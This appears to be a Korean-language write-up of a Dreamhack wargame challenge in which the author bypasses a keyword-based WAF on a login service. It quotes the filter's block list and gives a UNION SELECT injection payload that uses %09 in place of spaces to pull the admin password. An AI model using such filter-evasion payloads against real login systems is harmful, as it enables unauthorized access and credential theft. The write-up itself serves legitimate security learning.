# sql injection bypass WAF

## 문제 링크
https://dreamhack.io/wargame/challenges/415

## 문제 설명
WAF을 실습할 수 있는 로그인 서비스이다. admin으로 접속해 플래그를 획득하는 것이 목표이다.

## 풀이과정
1. 제시된 파이썬 코드의
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False
부분을 보면 특정 키워드가 요청 데이터에 포함되면 접속을 막는 웹 방화벽 필터 역할을 한다는 것을 알 수 있다. 
2. 대/소문자 구분을 하기 때문에 ADMIN으로 접속해 보았지만 실패하였다. 다른 방법이 필요함을 알 수 있다.
3. 유니온을 사용하여
SELECT * FROM user WHERE uid='' UNION SELECT 1, upw, 3 FROM user WHERE uid='ADMIN';-- 
를 입력한다.
이때 백엔드 코드를 확인해 보면
if result:
            return template.format(uid=uid, result=result[1])
가 있다. 이는 uid, 즉 2번째 컬럼만 화면에 출력이 되기 때문에 우리가 알고싶은 upw를 2번째 컬럼 자리에 넣어준다.
4. 하지만 공백 또한 키워드로 필터링된다. > 공백을 없애야한다.
5. SQL injection 공백 우회 키워드인 %09를 공백 사이사이에 끼어넣어준다.
6. '%09UNION%09SELECT%091,upw,3%09FROM%09user%09WHERE%09uid='ADMIN';--
을 입력해보았지만,  입력창에 직접  입력하면 오류가 떴다.
7. 입력창에 직접 입력했을때는 %09를 브라우저에서 자동으로 디코딩 되었기 때문에 WAF에 걸렸다! > URL 주소창에 직접 입력하면 %09가 그대로 전달되고, 서버에서 뒤늦게 디코딩을 한다. 따라서 WAF 우회에 성공했고, 플래크를 얻을 수 있었다.

##  배운점
WAF를 우회하는 법에 대해서 익힐 수 있었다. 또한 브라우저에서 먼저 디코딩 하는 것을 대비하여 URL 주소에 직접 입력하는 경우도 있을 수 있다는 것을 알게 되었다.
